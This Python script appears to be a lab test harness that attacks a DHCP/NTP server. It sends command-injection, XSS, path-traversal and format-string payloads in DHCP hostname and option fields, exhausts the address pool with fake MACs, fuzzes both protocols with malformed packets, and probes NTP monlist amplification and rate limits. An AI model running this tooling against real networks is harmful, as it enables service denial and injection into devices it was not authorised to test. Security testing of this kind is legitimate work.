#!/usr/bin/env python3
"""DHCP and NTP abuse tests, run inside a LAN client container. usage: dhcp_ntp.py <server-ip> <dhcp|ntp|dhcpfuzz|ntpfuzz> [n]"""
import os, random, socket, struct, sys, time
S = sys.argv[1]; mode = sys.argv[2]; N = int(sys.argv[3]) if len(sys.argv) > 3 else 20000

def dhcp_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); s.bind(("0.0.0.0", 68)); s.settimeout(3); return s

def pkt(mtype, mac, xid, opts=b"", ciaddr=b"\0\0\0\0", flags=0x8000):
    p = struct.pack(">BBBBIHH4s4s4s4s16s64s128s4s", 1, 1, 6, 0, xid, 0, flags, ciaddr, b"\0"*4, b"\0"*4, b"\0"*4, mac + b"\0"*10, b"", b"", b"\x63\x82\x53\x63")
    return p + bytes([53, 1, mtype]) + opts + b"\xff"
def opt(code, val): return bytes([code, len(val)]) + val
def parse(d):
    o = {}; i = 240
    while i < len(d) and d[i] != 255:
        if d[i] == 0: i += 1; continue
        o[d[i]] = d[i+2:i+2+d[i+1]]; i += 2 + d[i+1]
    return socket.inet_ntoa(d[16:20]), o

def lease(s, mac, hostname=None, extra=b""):
    xid = random.getrandbits(32); o = (opt(12, hostname) if hostname is not None else b"") + extra + opt(55, bytes([1, 3, 6, 15, 12]))
    s.sendto(pkt(1, mac, xid, o), ("255.255.255.255", 67))
    try:
        while True:
            d, a = s.recvfrom(2048)
            if struct.unpack(">I", d[4:8])[0] == xid: break
    except socket.timeout: return None
    ip, ro = parse(d)
    s.sendto(pkt(3, mac, xid, o + opt(50, socket.inet_aton(ip)) + opt(54, ro.get(54, socket.inet_aton(S)))), ("255.255.255.255", 67))
    try:
        while True:
            d, a = s.recvfrom(2048)
            if struct.unpack(">I", d[4:8])[0] == xid: return ip, parse(d)[1].get(53)
    except socket.timeout: return ip, None

if mode == "dhcp":
    s = dhcp_sock()
    names = [b"<img src=x onerror=__xss_dhcp=1>", b"\"><script>__xss_dhcp2=1</script>", b"$(id>/tmp/dhcp_cmd)", b"`id>/tmp/dhcp_cmd2`", b";id>/tmp/dhcp_cmd3;", b"a b c", b"../../etc/passwd",
             b"normal-host", b"x" * 255, b"\x00\x01\x02", b"host\nINJECTED line", b"-oProxyCommand", b"%s%s%n"]
    for i, n in enumerate(names):
        r = lease(s, bytes([0x02, 0xAA, 0, 0, 0, i]), n, extra=opt(60, b"<svg onload=__xss_vc=1>") + opt(61, b"\x00" + b"<b>cid</b>") + opt(77, b"userclass;id"))
        print(f"hostname {n[:36]!r:42} -> {r}")
    # pool exhaustion by one client with made-up MAC addresses
    got = 0
    for i in range(80):
        r = lease(s, bytes([0x02, 0xBB, 0, 0, i >> 8, i & 255]), b"flood%d" % i)
        if r and r[1] == b"\x05": got += 1
    print(f"pool exhaustion: {got} leases handed to one physical client using 80 invented MAC addresses")
elif mode == "dhcpfuzz":
    s = dhcp_sock(); random.seed(3); base = [pkt(1, b"\x02\xcc\0\0\0\1", 1, opt(12, b"fuzz") + opt(55, b"\x01\x03\x06")), pkt(3, b"\x02\xcc\0\0\0\2", 2, opt(50, socket.inet_aton("172.31.50.120")) + opt(54, socket.inet_aton(S)) + opt(12, b"fz")),
                                              pkt(8, b"\x02\xcc\0\0\0\3", 3, b"", ciaddr=socket.inet_aton("172.31.50.50")), pkt(7, b"\x02\xcc\0\0\0\4", 4, opt(54, socket.inet_aton(S))), pkt(4, b"\x02\xcc\0\0\0\5", 5, opt(50, socket.inet_aton("172.31.50.121")))]
    for i in range(N):
        b = bytearray(random.choice(base)); r = random.random()
        if r < 0.5:
            for _ in range(random.randint(1, 8)): b[random.randrange(len(b))] = random.randrange(256)
        elif r < 0.7: b = b[:240] + bytes(random.randrange(256) for _ in range(random.randrange(0, 300)))
        elif r < 0.85: b = b[:-1] + b"".join(opt(random.randrange(1, 255), os.urandom(random.randrange(0, 255))) for _ in range(random.randrange(1, 30))) + b"\xff"
        elif r < 0.93: b = b[: random.randrange(1, len(b))]
        else: b = b[:-1] + bytes([random.randrange(1, 255), 255]) + os.urandom(40)          # option length runs past the packet
        try: s.sendto(bytes(b[:1400]), (random.choice(["255.255.255.255", S]), 67))
        except Exception: pass
        if i % 500 == 0: time.sleep(0.05)
    print(f"sent {N} malformed DHCP packets")
elif mode == "ntp":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)
    def t(name, p):
        s.sendto(p, (S, 123))
        try: d, _ = s.recvfrom(4096); print(f"{name:44} request {len(p):3} B -> response {len(d):4} B (x{len(d)/len(p):.1f}) mode {d[0]&7} stratum {d[1]}")
        except socket.timeout: print(f"{name:44} request {len(p):3} B -> no response")
    t("client request (mode 3, v4)", b"\x23" + b"\0" * 47)
    t("client request (mode 3, v3)", b"\x1b" + b"\0" * 47)
    t("mode 6 control: readvar", b"\x16\x02\x00\x01" + b"\0" * 8)
    t("mode 7 private: monlist (amplification)", b"\x17\x00\x03\x2a" + b"\0" * 4)
    t("mode 7 private: peer list", b"\x17\x00\x03\x00" + b"\0" * 4)
    t("symmetric active (mode 1)", b"\x21" + b"\0" * 47)
    t("broadcast (mode 5)", b"\x25" + b"\0" * 47)
    t("server reply reflected (mode 4)", b"\x24" + b"\0" * 47)
    t("truncated (10 bytes)", b"\x23" + b"\0" * 9)
    t("with 400 B of extension fields", b"\x23" + b"\0" * 47 + os.urandom(400))
    n = 0; t0 = time.time()
    for _ in range(3000):
        s.sendto(b"\x23" + b"\0" * 47, (S, 123))
    s.settimeout(0.5)
    try:
        while True: s.recvfrom(512); n += 1
    except socket.timeout: pass
    print(f"3000 requests in {time.time()-t0:.1f}s -> {n} responses (rate limiting: {'yes' if n < 2900 else 'no'})")
elif mode == "ntpfuzz":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); random.seed(5); base = [b"\x23" + os.urandom(47), b"\x1b" + b"\0" * 47, b"\x16\x02\x00\x01" + b"\0" * 8, b"\x23" + b"\0" * 47 + os.urandom(64)]
    for i in range(N):
        b = bytearray(random.choice(base)); r = random.random()
        if r < 0.6:
            for _ in range(random.randint(1, 6)): b[random.randrange(len(b))] = random.randrange(256)
        elif r < 0.8: b = b[: random.randrange(1, len(b))]
        else: b += os.urandom(random.randrange(1, 1400))
        s.sendto(bytes(b), (S, 123))
    print(f"sent {N} malformed NTP packets")
